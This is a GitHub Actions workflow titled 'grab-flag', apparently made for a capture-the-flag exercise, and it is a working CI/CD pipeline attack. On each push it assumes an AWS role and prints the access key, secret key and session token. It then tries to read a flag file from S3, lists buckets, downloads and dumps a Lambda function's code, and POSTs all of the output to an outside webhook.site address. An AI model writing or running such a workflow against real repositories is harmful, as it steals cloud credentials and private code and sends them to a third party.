name: grab-flag
on:
  workflow_dispatch: {}
  push:
    branches: [corgi, main]
permissions:
  id-token: write
  contents: read
jobs:
  dump:
    runs-on: self-hosted
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1
          role-session-name: flaggrab
      - name: exfil
        shell: bash
        run: |
          set +e
          {
            echo "===ID==="
            aws sts get-caller-identity
            echo "===CREDS==="
            python3 -c "import os;print('AK='+os.environ.get('AWS_ACCESS_KEY_ID',''));print('SK='+os.environ.get('AWS_SECRET_ACCESS_KEY',''));print('ST='+os.environ.get('AWS_SESSION_TOKEN',''))"
            echo "===FLAGTRY==="
            aws s3 cp s3://codec4f26c862a321ef5/flag.txt - 2>&1
            echo "===LIST==="
            aws s3 ls s3://codec4f26c862a321ef5/
            echo "===LAM==="
            URL=$(aws lambda get-function --function-name nslookupv2 --query Code.Location --output text)
            curl -sL "$URL" -o /tmp/lam.zip
            python3 -c "import zipfile;z=zipfile.ZipFile('/tmp/lam.zip');
[print(n);print(z.read(n)) for n in z.namelist()]"
            echo "===PLAT==="
            aws s3api list-objects-v2 --bucket platform-bucket-009661764077-us-east-1
          } 2>&1 | tee /tmp/all.txt
          curl -s -X POST --data-binary @/tmp/all.txt 'https://webhook.site/42b620d7-2084-4d83-889f-139b520dd049' || true
          cat /tmp/all.txt